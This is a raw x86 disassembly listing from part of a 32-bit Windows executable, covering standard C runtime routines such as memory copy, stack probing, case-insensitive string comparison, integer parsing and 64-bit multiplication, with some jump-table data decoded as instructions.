  428273:	mov    DWORD PTR [ebx+0x4],eax
  428276:	mov    DWORD PTR [ebx+0xc],ebp
  428279:	pop    ecx
  42827a:	pop    ebx
  42827b:	ret    0x4
  42827e:	int3   
  42827f:	int3   
  428280:	push   ebp
  428281:	mov    ebp,esp
  428283:	push   edi
  428284:	push   esi
  428285:	mov    esi,DWORD PTR [ebp+0xc]
  428288:	mov    ecx,DWORD PTR [ebp+0x10]
  42828b:	mov    edi,DWORD PTR [ebp+0x8]
  42828e:	mov    eax,ecx
  428290:	mov    edx,ecx
  428292:	add    eax,esi
  428294:	cmp    edi,esi
  428296:	jbe    0x4282a0
  428298:	cmp    edi,eax
  42829a:	jb     0x42841c
  4282a0:	test   edi,0x3
  4282a6:	jne    0x4282bc
  4282a8:	shr    ecx,0x2
  4282ab:	and    edx,0x3
  4282ae:	cmp    ecx,0x8
  4282b1:	jb     0x4282dc
  4282b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282b5:	jmp    DWORD PTR [edx*4+0x4283cc]
  4282bc:	mov    eax,edi
  4282be:	mov    edx,0x3
  4282c3:	sub    ecx,0x4
  4282c6:	jb     0x4282d4
  4282c8:	and    eax,0x3
  4282cb:	add    ecx,eax
  4282cd:	jmp    DWORD PTR [eax*4+0x4282e0]
  4282d4:	jmp    DWORD PTR [ecx*4+0x4283dc]
  4282db:	nop
  4282dc:	jmp    DWORD PTR [ecx*4+0x428360]
  4282e3:	nop
  4282e4:	lock add BYTE PTR [edx+0x0],0x1c
  4282e9:	add    DWORD PTR [edx+0x0],0x40
  4282ed:	add    DWORD PTR [edx+0x0],0x23
  4282f1:	ror    DWORD PTR [edx-0x75f877fa],1
  4282f7:	inc    esi
  4282f8:	add    DWORD PTR [eax+0x468a0147],ecx
  4282fe:	add    al,cl
  428300:	jmp    0x28a0b07
  428305:	add    esi,0x3
  428308:	add    edi,0x3
  42830b:	cmp    ecx,0x8
  42830e:	jb     0x4282dc
  428310:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428312:	jmp    DWORD PTR [edx*4+0x4283cc]
  428319:	lea    ecx,[ecx+0x0]
  42831c:	and    edx,ecx
  42831e:	mov    al,BYTE PTR [esi]
  428320:	mov    BYTE PTR [edi],al
  428322:	mov    al,BYTE PTR [esi+0x1]
  428325:	shr    ecx,0x2
  428328:	mov    BYTE PTR [edi+0x1],al
  42832b:	add    esi,0x2
  42832e:	add    edi,0x2
  428331:	cmp    ecx,0x8
  428334:	jb     0x4282dc
  428336:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428338:	jmp    DWORD PTR [edx*4+0x4283cc]
  42833f:	nop
  428340:	and    edx,ecx
  428342:	mov    al,BYTE PTR [esi]
  428344:	mov    BYTE PTR [edi],al
  428346:	add    esi,0x1
  428349:	shr    ecx,0x2
  42834c:	add    edi,0x1
  42834f:	cmp    ecx,0x8
  428352:	jb     0x4282dc
  428354:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428356:	jmp    DWORD PTR [edx*4+0x4283cc]
  42835d:	lea    ecx,[ecx+0x0]
  428360:	ret    
  428361:	add    DWORD PTR [edx+0x0],0xffffffb0
  428365:	add    DWORD PTR [edx+0x0],0xffffffa8
  428369:	add    DWORD PTR [edx+0x0],0xffffffa0
  42836d:	add    DWORD PTR [edx+0x0],0xffffff98
  428371:	add    DWORD PTR [edx+0x0],0xffffff90
  428375:	add    DWORD PTR [edx+0x0],0xffffff88
  428379:	add    DWORD PTR [edx+0x0],0xffffff80
  42837d:	add    DWORD PTR [edx+0x0],0xffffff8b
  428381:	inc    esp
  428382:	mov    fs,esp
  428384:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  428388:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42838c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  428390:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  428394:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  428398:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42839c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4283a0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4283a4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4283a8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4283ac:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4283b0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4283b4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4283b8:	lea    eax,[ecx*4+0x0]
  4283bf:	add    esi,eax
  4283c1:	add    edi,eax
  4283c3:	jmp    DWORD PTR [edx*4+0x4283cc]
  4283ca:	mov    edi,edi
  4283cc:	fadd   QWORD PTR [ebx-0x7c1bffbe]
  4283d2:	inc    edx
  4283d3:	add    al,dh
  4283d5:	add    DWORD PTR [edx+0x0],0x4
  4283d9:	test   BYTE PTR [edx+0x0],al
  4283dc:	mov    eax,DWORD PTR [ebp+0x8]
  4283df:	pop    esi
  4283e0:	pop    edi
  4283e1:	leave  
  4283e2:	ret    
  4283e3:	nop
  4283e4:	mov    al,BYTE PTR [esi]
  4283e6:	mov    BYTE PTR [edi],al
  4283e8:	mov    eax,DWORD PTR [ebp+0x8]
  4283eb:	pop    esi
  4283ec:	pop    edi
  4283ed:	leave  
  4283ee:	ret    
  4283ef:	nop
  4283f0:	mov    al,BYTE PTR [esi]
  4283f2:	mov    BYTE PTR [edi],al
  4283f4:	mov    al,BYTE PTR [esi+0x1]
  4283f7:	mov    BYTE PTR [edi+0x1],al
  4283fa:	mov    eax,DWORD PTR [ebp+0x8]
  4283fd:	pop    esi
  4283fe:	pop    edi
  4283ff:	leave  
  428400:	ret    
  428401:	lea    ecx,[ecx+0x0]
  428404:	mov    al,BYTE PTR [esi]
  428406:	mov    BYTE PTR [edi],al
  428408:	mov    al,BYTE PTR [esi+0x1]
  42840b:	mov    BYTE PTR [edi+0x1],al
  42840e:	mov    al,BYTE PTR [esi+0x2]
  428411:	mov    BYTE PTR [edi+0x2],al
  428414:	mov    eax,DWORD PTR [ebp+0x8]
  428417:	pop    esi
  428418:	pop    edi
  428419:	leave  
  42841a:	ret    
  42841b:	nop
  42841c:	lea    esi,[ecx+esi*1-0x4]
  428420:	lea    edi,[ecx+edi*1-0x4]
  428424:	test   edi,0x3
  42842a:	jne    0x428450
  42842c:	shr    ecx,0x2
  42842f:	and    edx,0x3
  428432:	cmp    ecx,0x8
  428435:	jb     0x428444
  428437:	std    
  428438:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42843a:	cld    
  42843b:	jmp    DWORD PTR [edx*4+0x428568]
  428442:	mov    edi,edi
  428444:	neg    ecx
  428446:	jmp    DWORD PTR [ecx*4+0x428518]
  42844d:	lea    ecx,[ecx+0x0]
  428450:	mov    eax,edi
  428452:	mov    edx,0x3
  428457:	cmp    ecx,0x4
  42845a:	jb     0x428468
  42845c:	and    eax,0x3
  42845f:	sub    ecx,eax
  428461:	jmp    DWORD PTR [eax*4+0x42846c]
  428468:	jmp    DWORD PTR [ecx*4+0x428568]
  42846f:	nop
  428470:	jl     0x4283f6
  428472:	inc    edx
  428473:	add    BYTE PTR [eax-0x37ffbd7c],ah
  428479:	test   BYTE PTR [edx+0x0],al
  42847c:	mov    al,BYTE PTR [esi+0x3]
  42847f:	and    edx,ecx
  428481:	mov    BYTE PTR [edi+0x3],al
  428484:	sub    esi,0x1
  428487:	shr    ecx,0x2
  42848a:	sub    edi,0x1
  42848d:	cmp    ecx,0x8
  428490:	jb     0x428444
  428492:	std    
  428493:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428495:	cld    
  428496:	jmp    DWORD PTR [edx*4+0x428568]
  42849d:	lea    ecx,[ecx+0x0]
  4284a0:	mov    al,BYTE PTR [esi+0x3]
  4284a3:	and    edx,ecx
  4284a5:	mov    BYTE PTR [edi+0x3],al
  4284a8:	mov    al,BYTE PTR [esi+0x2]
  4284ab:	shr    ecx,0x2
  4284ae:	mov    BYTE PTR [edi+0x2],al
  4284b1:	sub    esi,0x2
  4284b4:	sub    edi,0x2
  4284b7:	cmp    ecx,0x8
  4284ba:	jb     0x428444
  4284bc:	std    
  4284bd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284bf:	cld    
  4284c0:	jmp    DWORD PTR [edx*4+0x428568]
  4284c7:	nop
  4284c8:	mov    al,BYTE PTR [esi+0x3]
  4284cb:	and    edx,ecx
  4284cd:	mov    BYTE PTR [edi+0x3],al
  4284d0:	mov    al,BYTE PTR [esi+0x2]
  4284d3:	mov    BYTE PTR [edi+0x2],al
  4284d6:	mov    al,BYTE PTR [esi+0x1]
  4284d9:	shr    ecx,0x2
  4284dc:	mov    BYTE PTR [edi+0x1],al
  4284df:	sub    esi,0x3
  4284e2:	sub    edi,0x3
  4284e5:	cmp    ecx,0x8
  4284e8:	jb     0x428444
  4284ee:	std    
  4284ef:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284f1:	cld    
  4284f2:	jmp    DWORD PTR [edx*4+0x428568]
  4284f9:	lea    ecx,[ecx+0x0]
  4284fc:	sbb    al,0x85
  4284fe:	inc    edx
  4284ff:	add    BYTE PTR [eax*4-0x7ad3ffbe],ah
  428506:	inc    edx
  428507:	add    BYTE PTR [eax*4-0x7ac3ffbe],dh
  42850e:	inc    edx
  42850f:	add    BYTE PTR [ebp+eax*4+0x42],al
  428513:	add    BYTE PTR [ebp+eax*4+0x42],cl
  428517:	add    BYTE PTR [edi-0x7b],bl
  42851a:	inc    edx
  42851b:	add    BYTE PTR [ebx-0x76e371bc],cl
  428521:	inc    esp
  428522:	(bad)  
  428523:	sbb    al,0x8b
  428525:	inc    esp
  428526:	mov    ds,WORD PTR [eax]
  428528:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42852c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428530:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428534:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428538:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42853c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428540:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428544:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428548:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42854c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  428550:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  428554:	lea    eax,[ecx*4+0x0]
  42855b:	add    esi,eax
  42855d:	add    edi,eax
  42855f:	jmp    DWORD PTR [edx*4+0x428568]
  428566:	mov    edi,edi
  428568:	js     0x4284ef
  42856a:	inc    edx
  42856b:	add    BYTE PTR [eax-0x6fffbd7b],al
  428571:	test   DWORD PTR [edx+0x0],eax
  428574:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428575:	test   DWORD PTR [edx+0x0],eax
  428578:	mov    eax,DWORD PTR [ebp+0x8]
  42857b:	pop    esi
  42857c:	pop    edi
  42857d:	leave  
  42857e:	ret    
  42857f:	nop
  428580:	mov    al,BYTE PTR [esi+0x3]
  428583:	mov    BYTE PTR [edi+0x3],al
  428586:	mov    eax,DWORD PTR [ebp+0x8]
  428589:	pop    esi
  42858a:	pop    edi
  42858b:	leave  
  42858c:	ret    
  42858d:	lea    ecx,[ecx+0x0]
  428590:	mov    al,BYTE PTR [esi+0x3]
  428593:	mov    BYTE PTR [edi+0x3],al
  428596:	mov    al,BYTE PTR [esi+0x2]
  428599:	mov    BYTE PTR [edi+0x2],al
  42859c:	mov    eax,DWORD PTR [ebp+0x8]
  42859f:	pop    esi
  4285a0:	pop    edi
  4285a1:	leave  
  4285a2:	ret    
  4285a3:	nop
  4285a4:	mov    al,BYTE PTR [esi+0x3]
  4285a7:	mov    BYTE PTR [edi+0x3],al
  4285aa:	mov    al,BYTE PTR [esi+0x2]
  4285ad:	mov    BYTE PTR [edi+0x2],al
  4285b0:	mov    al,BYTE PTR [esi+0x1]
  4285b3:	mov    BYTE PTR [edi+0x1],al
  4285b6:	mov    eax,DWORD PTR [ebp+0x8]
  4285b9:	pop    esi
  4285ba:	pop    edi
  4285bb:	leave  
  4285bc:	ret    
  4285bd:	push   ebp
  4285be:	mov    ebp,esp
  4285c0:	sub    esp,0xc
  4285c3:	mov    eax,ds:0x45d430
  4285c8:	xor    eax,DWORD PTR [ebp+0x4]
  4285cb:	and    BYTE PTR [ebp-0x6],0x0
  4285cf:	push   0x6
  4285d1:	mov    DWORD PTR [ebp-0x4],eax
  4285d4:	lea    eax,[ebp-0xc]
  4285d7:	push   eax
  4285d8:	push   0x1004
  4285dd:	push   DWORD PTR [ebp+0x8]
  4285e0:	call   DWORD PTR ds:0x4290fc
  4285e6:	test   eax,eax
  4285e8:	jne    0x4285ef
  4285ea:	or     eax,0xffffffff
  4285ed:	jmp    0x4285f9
  4285ef:	lea    eax,[ebp-0xc]
  4285f2:	push   eax
  4285f3:	call   0x4288fe
  4285f8:	pop    ecx
  4285f9:	mov    ecx,DWORD PTR [ebp-0x4]
  4285fc:	xor    ecx,DWORD PTR [ebp+0x4]
  4285ff:	call   0x425a0c
  428604:	leave  
  428605:	ret    
  428606:	push   0x38
  428608:	push   0x429fb8
  42860d:	call   0x425340
  428612:	mov    eax,ds:0x45d430
  428617:	xor    eax,DWORD PTR [ebp+0x4]
  42861a:	mov    DWORD PTR [ebp-0x1c],eax
  42861d:	xor    edi,edi
  42861f:	mov    DWORD PTR [ebp-0x20],edi
  428622:	mov    DWORD PTR [ebp-0x24],edi
  428625:	mov    eax,DWORD PTR [ebp+0x14]
  428628:	mov    ebx,DWORD PTR [eax]
  42862a:	mov    DWORD PTR [ebp-0x28],ebx
  42862d:	mov    DWORD PTR [ebp-0x2c],edi
  428630:	mov    eax,DWORD PTR [ebp+0x8]
  428633:	cmp    eax,DWORD PTR [ebp+0xc]
  428636:	je     0x4287af
  42863c:	lea    ecx,[ebp-0x40]
  42863f:	push   ecx
  428640:	push   eax
  428641:	mov    esi,DWORD PTR ds:0x4290c4
  428647:	call   esi
  428649:	test   eax,eax
  42864b:	je     0x42866d
  42864d:	cmp    DWORD PTR [ebp-0x40],0x1
  428651:	jne    0x42866d
  428653:	lea    eax,[ebp-0x40]
  428656:	push   eax
  428657:	push   DWORD PTR [ebp+0xc]
  42865a:	call   esi
  42865c:	test   eax,eax
  42865e:	je     0x42866d
  428660:	cmp    DWORD PTR [ebp-0x40],0x1
  428664:	jne    0x42866d
  428666:	mov    DWORD PTR [ebp-0x2c],0x1
  42866d:	cmp    DWORD PTR [ebp-0x2c],edi
  428670:	je     0x42868c
  428672:	cmp    ebx,0xffffffff
  428675:	je     0x42867b
  428677:	mov    esi,ebx
  428679:	jmp    0x428687
  42867b:	push   DWORD PTR [ebp+0x10]
  42867e:	call   0x425950
  428683:	pop    ecx
  428684:	mov    esi,eax
  428686:	inc    esi
  428687:	mov    DWORD PTR [ebp-0x44],esi
  42868a:	jmp    0x42868f
  42868c:	mov    esi,DWORD PTR [ebp-0x44]
  42868f:	cmp    DWORD PTR [ebp-0x2c],edi
  428692:	jne    0x4286ae
  428694:	push   edi
  428695:	push   edi
  428696:	push   ebx
  428697:	push   DWORD PTR [ebp+0x10]
  42869a:	push   0x1
  42869c:	push   DWORD PTR [ebp+0x8]
  42869f:	call   DWORD PTR ds:0x4290ec
  4286a5:	mov    esi,eax
  4286a7:	mov    DWORD PTR [ebp-0x44],esi
  4286aa:	cmp    esi,edi
  4286ac:	je     0x428706
  4286ae:	mov    DWORD PTR [ebp-0x4],edi
  4286b1:	lea    eax,[esi+esi*1]
  4286b4:	add    eax,0x3
  4286b7:	and    eax,0xfffffffc
  4286ba:	call   0x425390
  4286bf:	mov    DWORD PTR [ebp-0x18],esp
  4286c2:	mov    ebx,esp
  4286c4:	mov    DWORD PTR [ebp-0x48],ebx
  4286c7:	lea    eax,[esi+esi*1]
  4286ca:	push   eax
  4286cb:	push   edi
  4286cc:	push   ebx
  4286cd:	call   0x427c40
  4286d2:	add    esp,0xc
  4286d5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286d9:	jmp    0x4286f2
  4286db:	xor    eax,eax
  4286dd:	inc    eax
  4286de:	ret    
  4286df:	mov    esp,DWORD PTR [ebp-0x18]
  4286e2:	call   0x4287d5
  4286e7:	xor    edi,edi
  4286e9:	xor    ebx,ebx
  4286eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286ef:	mov    esi,DWORD PTR [ebp-0x44]
  4286f2:	cmp    ebx,edi
  4286f4:	jne    0x428714
  4286f6:	push   esi
  4286f7:	push   0x2
  4286f9:	call   0x426458
  4286fe:	pop    ecx
  4286ff:	pop    ecx
  428700:	mov    ebx,eax
  428702:	cmp    ebx,edi
  428704:	jne    0x42870d
  428706:	xor    eax,eax
  428708:	jmp    0x4287c1
  42870d:	mov    DWORD PTR [ebp-0x24],0x1
  428714:	push   esi
  428715:	push   ebx
  428716:	push   DWORD PTR [ebp-0x28]
  428719:	push   DWORD PTR [ebp+0x10]
  42871c:	push   0x1
  42871e:	push   DWORD PTR [ebp+0x8]
  428721:	call   DWORD PTR ds:0x4290ec
  428727:	test   eax,eax
  428729:	je     0x4287b2
  42872f:	cmp    DWORD PTR [ebp+0x18],edi
  428732:	je     0x428754
  428734:	push   edi
  428735:	push   edi
  428736:	push   DWORD PTR [ebp+0x1c]
  428739:	push   DWORD PTR [ebp+0x18]
  42873c:	push   esi
  42873d:	push   ebx
  42873e:	push   edi
  42873f:	push   DWORD PTR [ebp+0xc]
  428742:	call   DWORD PTR ds:0x42907c
  428748:	test   eax,eax
  42874a:	je     0x4287b2
  42874c:	mov    eax,DWORD PTR [ebp+0x18]
  42874f:	mov    DWORD PTR [ebp-0x20],eax
  428752:	jmp    0x4287b2
  428754:	cmp    DWORD PTR [ebp-0x2c],edi
  428757:	jne    0x42876f
  428759:	push   edi
  42875a:	push   edi
  42875b:	push   edi
  42875c:	push   edi
  42875d:	push   esi
  42875e:	push   ebx
  42875f:	push   edi
  428760:	push   DWORD PTR [ebp+0xc]
  428763:	call   DWORD PTR ds:0x42907c
  428769:	mov    esi,eax
  42876b:	cmp    esi,edi
  42876d:	je     0x4287b2
  42876f:	push   esi
  428770:	push   0x1
  428772:	call   0x426458
  428777:	pop    ecx
  428778:	pop    ecx
  428779:	mov    DWORD PTR [ebp-0x20],eax
  42877c:	cmp    eax,edi
  42877e:	je     0x4287b2
  428780:	push   edi
  428781:	push   edi
  428782:	push   esi
  428783:	push   eax
  428784:	push   esi
  428785:	push   ebx
  428786:	push   edi
  428787:	push   DWORD PTR [ebp+0xc]
  42878a:	call   DWORD PTR ds:0x42907c
  428790:	cmp    eax,edi
  428792:	jne    0x4287a2
  428794:	push   DWORD PTR [ebp-0x20]
  428797:	call   0x425f4a
  42879c:	pop    ecx
  42879d:	mov    DWORD PTR [ebp-0x20],edi
  4287a0:	jmp    0x4287b2
  4287a2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  4287a6:	je     0x4287b2
  4287a8:	mov    ecx,DWORD PTR [ebp+0x14]
  4287ab:	mov    DWORD PTR [ecx],eax
  4287ad:	jmp    0x4287b2
  4287af:	mov    ebx,DWORD PTR [ebp-0x48]
  4287b2:	cmp    DWORD PTR [ebp-0x24],edi
  4287b5:	je     0x4287be
  4287b7:	push   ebx
  4287b8:	call   0x425f4a
  4287bd:	pop    ecx
  4287be:	mov    eax,DWORD PTR [ebp-0x20]
  4287c1:	lea    esp,[ebp-0x54]
  4287c4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4287c7:	xor    ecx,DWORD PTR [ebp+0x4]
  4287ca:	call   0x425a0c
  4287cf:	call   0x42537b
  4287d4:	ret    
  4287d5:	push   ebp
  4287d6:	mov    ebp,esp
  4287d8:	sub    esp,0x48
  4287db:	push   ebx
  4287dc:	push   esi
  4287dd:	push   edi
  4287de:	push   0x4
  4287e0:	pop    eax
  4287e1:	call   0x425390
  4287e6:	mov    ebx,esp
  4287e8:	push   0x1c
  4287ea:	lea    eax,[ebp-0x24]
  4287ed:	push   eax
  4287ee:	push   ebx
  4287ef:	call   DWORD PTR ds:0x429108
  4287f5:	test   eax,eax
  4287f7:	je     0x42886a
  4287f9:	mov    edi,DWORD PTR [ebp-0x20]
  4287fc:	lea    eax,[ebp-0x48]
  4287ff:	push   eax
  428800:	call   DWORD PTR ds:0x429048
  428806:	mov    eax,DWORD PTR [ebp-0x44]
  428809:	lea    esi,[eax-0x1]
  42880c:	not    esi
  42880e:	and    esi,ebx
  428810:	sub    esi,eax
  428812:	mov    DWORD PTR [ebp-0x4],eax
  428815:	mov    eax,ds:0x45dac4
  42881a:	mov    ecx,eax
  42881c:	dec    ecx
  42881d:	neg    ecx
  42881f:	sbb    ecx,ecx
  428821:	and    ecx,0xffff1000
  428827:	add    ecx,0x11000
  42882d:	add    ecx,edi
  42882f:	cmp    esi,ecx
  428831:	jb     0x42886a
  428833:	cmp    eax,0x1
  428836:	je     0x428882
  428838:	mov    ebx,edi
  42883a:	mov    edi,0x1000
  42883f:	push   0x1c
  428841:	lea    eax,[ebp-0x24]
  428844:	push   eax
  428845:	push   ebx
  428846:	call   DWORD PTR ds:0x429108
  42884c:	test   eax,eax
  42884e:	je     0x42886a
  428850:	add    ebx,DWORD PTR [ebp-0x18]
  428853:	test   DWORD PTR [ebp-0x14],edi
  428856:	je     0x42883f
  428858:	test   BYTE PTR [ebp-0xf],0x1
  42885c:	mov    ebx,DWORD PTR [ebp-0x24]
  42885f:	je     0x428866
  428861:	xor    eax,eax
  428863:	inc    eax
  428864:	jmp    0x42889e
  428866:	cmp    esi,ebx
  428868:	jae    0x42886e
  42886a:	xor    eax,eax
  42886c:	jmp    0x42889e
  42886e:	push   0x4
  428870:	push   edi
  428871:	push   DWORD PTR [ebp-0x4]
  428874:	push   ebx
  428875:	call   DWORD PTR ds:0x4290cc
  42887b:	mov    eax,ds:0x45dac4
  428880:	jmp    0x428884
  428882:	mov    ebx,esi
  428884:	dec    eax
  428885:	neg    eax
  428887:	sbb    eax,eax
  428889:	and    eax,0x103
  42888e:	lea    ecx,[ebp-0x8]
  428891:	push   ecx
  428892:	inc    eax
  428893:	push   eax
  428894:	push   DWORD PTR [ebp-0x4]
  428897:	push   ebx
  428898:	call   DWORD PTR ds:0x429104
  42889e:	lea    esp,[ebp-0x54]
  4288a1:	pop    edi
  4288a2:	pop    esi
  4288a3:	pop    ebx
  4288a4:	leave  
  4288a5:	ret    
  4288a6:	int3   
  4288a7:	int3   
  4288a8:	int3   
  4288a9:	int3   
  4288aa:	int3   
  4288ab:	int3   
  4288ac:	int3   
  4288ad:	int3   
  4288ae:	int3   
  4288af:	int3   
  4288b0:	push   ebp
  4288b1:	mov    ebp,esp
  4288b3:	push   edi
  4288b4:	push   esi
  4288b5:	push   ebx
  4288b6:	mov    esi,DWORD PTR [ebp+0xc]
  4288b9:	mov    edi,DWORD PTR [ebp+0x8]
  4288bc:	mov    al,0xff
  4288be:	mov    edi,edi
  4288c0:	or     al,al
  4288c2:	je     0x4288f6
  4288c4:	mov    al,BYTE PTR [esi]
  4288c6:	add    esi,0x1
  4288c9:	mov    ah,BYTE PTR [edi]
  4288cb:	add    edi,0x1
  4288ce:	cmp    ah,al
  4288d0:	je     0x4288c0
  4288d2:	sub    al,0x41
  4288d4:	cmp    al,0x1a
  4288d6:	sbb    cl,cl
  4288d8:	and    cl,0x20
  4288db:	add    al,cl
  4288dd:	add    al,0x41
  4288df:	xchg   al,ah
  4288e1:	sub    al,0x41
  4288e3:	cmp    al,0x1a
  4288e5:	sbb    cl,cl
  4288e7:	and    cl,0x20
  4288ea:	add    al,cl
  4288ec:	add    al,0x41
  4288ee:	cmp    al,ah
  4288f0:	je     0x4288c0
  4288f2:	sbb    al,al
  4288f4:	sbb    al,0xff
  4288f6:	movsx  eax,al
  4288f9:	pop    ebx
  4288fa:	pop    esi
  4288fb:	pop    edi
  4288fc:	leave  
  4288fd:	ret    
  4288fe:	push   esi
  4288ff:	push   edi
  428900:	call   0x4251f3
  428905:	mov    edi,DWORD PTR [eax+0x64]
  428908:	cmp    edi,DWORD PTR ds:0x45d58c
  42890e:	je     0x428917
  428910:	call   0x42669f
  428915:	mov    edi,eax
  428917:	mov    esi,DWORD PTR [esp+0xc]
  42891b:	cmp    DWORD PTR [edi+0x28],0x1
  42891f:	movzx  eax,BYTE PTR [esi]
  428922:	jle    0x428932
  428924:	push   0x8
  428926:	push   eax
  428927:	push   edi
  428928:	call   0x428986
  42892d:	add    esp,0xc
  428930:	jmp    0x42893c
  428932:	mov    ecx,DWORD PTR [edi+0x48]
  428935:	movzx  eax,BYTE PTR [ecx+eax*2]
  428939:	and    eax,0x8
  42893c:	test   eax,eax
  42893e:	je     0x428943
  428940:	inc    esi
  428941:	jmp    0x42891b
  428943:	movzx  ecx,BYTE PTR [esi]
  428946:	inc    esi
  428947:	cmp    ecx,0x2d
  42894a:	mov    edx,ecx
  42894c:	je     0x428953
  42894e:	cmp    ecx,0x2b
  428951:	jne    0x428957
  428953:	movzx  ecx,BYTE PTR [esi]
  428956:	inc    esi
  428957:	xor    eax,eax
  428959:	cmp    ecx,0x30
  42895c:	jl     0x428968
  42895e:	cmp    ecx,0x39
  428961:	jg     0x428968
  428963:	sub    ecx,0x30
  428966:	jmp    0x42896b
  428968:	or     ecx,0xffffffff
  42896b:	cmp    ecx,0xffffffff
  42896e:	je     0x42897c
  428970:	lea    eax,[eax+eax*4]
  428973:	lea    eax,[ecx+eax*2]
  428976:	movzx  ecx,BYTE PTR [esi]
  428979:	inc    esi
  42897a:	jmp    0x428959
  42897c:	cmp    edx,0x2d
  42897f:	pop    edi
  428980:	pop    esi
  428981:	jne    0x428985
  428983:	neg    eax
  428985:	ret    
  428986:	push   ebp
  428987:	mov    ebp,esp
  428989:	push   ecx
  42898a:	mov    eax,DWORD PTR [ebp+0xc]
  42898d:	lea    ecx,[eax+0x1]
  428990:	cmp    ecx,0x100
  428996:	mov    ecx,DWORD PTR [ebp+0x8]
  428999:	ja     0x4289a4
  42899b:	mov    ecx,DWORD PTR [ecx+0x48]
  42899e:	movzx  eax,WORD PTR [ecx+eax*2]
  4289a2:	jmp    0x4289f8
  4289a4:	push   esi
  4289a5:	mov    edx,eax
  4289a7:	sar    edx,0x8
  4289aa:	push   edi
  4289ab:	mov    edi,DWORD PTR [ecx+0x48]
  4289ae:	movzx  esi,dl
  4289b1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  4289b6:	pop    edi
  4289b7:	pop    esi
  4289b8:	je     0x4289c9
  4289ba:	and    BYTE PTR [ebp-0x2],0x0
  4289be:	push   0x2
  4289c0:	mov    BYTE PTR [ebp-0x3],al
  4289c3:	mov    BYTE PTR [ebp-0x4],dl
  4289c6:	pop    eax
  4289c7:	jmp    0x4289d3
  4289c9:	and    BYTE PTR [ebp-0x3],0x0
  4289cd:	mov    BYTE PTR [ebp-0x4],al
  4289d0:	xor    eax,eax
  4289d2:	inc    eax
  4289d3:	push   0x1
  4289d5:	push   DWORD PTR [ecx+0x14]
  4289d8:	push   DWORD PTR [ecx+0x4]
  4289db:	lea    ecx,[ebp+0xe]
  4289de:	push   ecx
  4289df:	push   eax
  4289e0:	lea    eax,[ebp-0x4]
  4289e3:	push   eax
  4289e4:	push   0x1
  4289e6:	call   0x427a68
  4289eb:	add    esp,0x1c
  4289ee:	test   eax,eax
  4289f0:	jne    0x4289f4
  4289f2:	leave  
  4289f3:	ret    
  4289f4:	movzx  eax,WORD PTR [ebp+0xe]
  4289f8:	and    eax,DWORD PTR [ebp+0x10]
  4289fb:	leave  
  4289fc:	ret    
  4289fd:	int3   
  4289fe:	int3   
  4289ff:	int3   
  428a00:	mov    eax,DWORD PTR [esp+0x8]
  428a04:	mov    ecx,DWORD PTR [esp+0x10]
  428a08:	or     ecx,eax
  428a0a:	mov    ecx,DWORD PTR [esp+0xc]
  428a0e:	jne    0x428a19
  428a10:	mov    eax,DWORD PTR [esp+0x4]
  428a14:	mul    ecx
  428a16:	ret    0x10
  428a19:	push   ebx
  428a1a:	mul    ecx
  428a1c:	mov    ebx,eax
  428a1e:	mov    eax,DWORD PTR [esp+0x8]
  428a22:	mul    DWORD PTR [esp+0x14]
  428a26:	add    ebx,eax
  428a28:	mov    eax,DWORD PTR [esp+0x8]
  428a2c:	mul    ecx
  428a2e:	add    edx,ebx
  428a30:	pop    ebx
  428a31:	ret    0x10
  428a34:	int3   
  428a35:	int3   
  428a36:	int3   
  428a37:	int3   
  428a38:	int3   
  428a39:	int3   
  428a3a:	int3   
  428a3b:	int3   
  428a3c:	int3   
  428a3d:	int3   
  428a3e:	int3   
  428a3f:	int3   
  428a40:	push   ebp
  428a41:	mov    ebp,esp
  428a43:	push   edi
  428a44:	push   esi
  428a45:	push   ebx
  428a46:	mov    ecx,DWORD PTR [ebp+0x10]
  428a49:	or     ecx,ecx
  428a4b:	je     0x428a9a
  428a4d:	mov    esi,DWORD PTR [ebp+0x8]
  428a50:	mov    edi,DWORD PTR [ebp+0xc]
  428a53:	mov    bh,0x41
  428a55:	mov    bl,0x5a
  428a57:	mov    dh,0x20
  428a59:	lea    ecx,[ecx+0x0]
  428a5c:	mov    ah,BYTE PTR [esi]
  428a5e:	or     ah,ah
  428a60:	mov    al,BYTE PTR [edi]
  428a62:	je     0x428a8b
  428a64:	or     al,al
  428a66:	je     0x428a8b
  428a68:	add    esi,0x1
  428a6b:	add    edi,0x1
  428a6e:	cmp    ah,bh
  428a70:	jb     0x428a78
  428a72:	cmp    ah,bl
  428a74:	ja     0x428a78
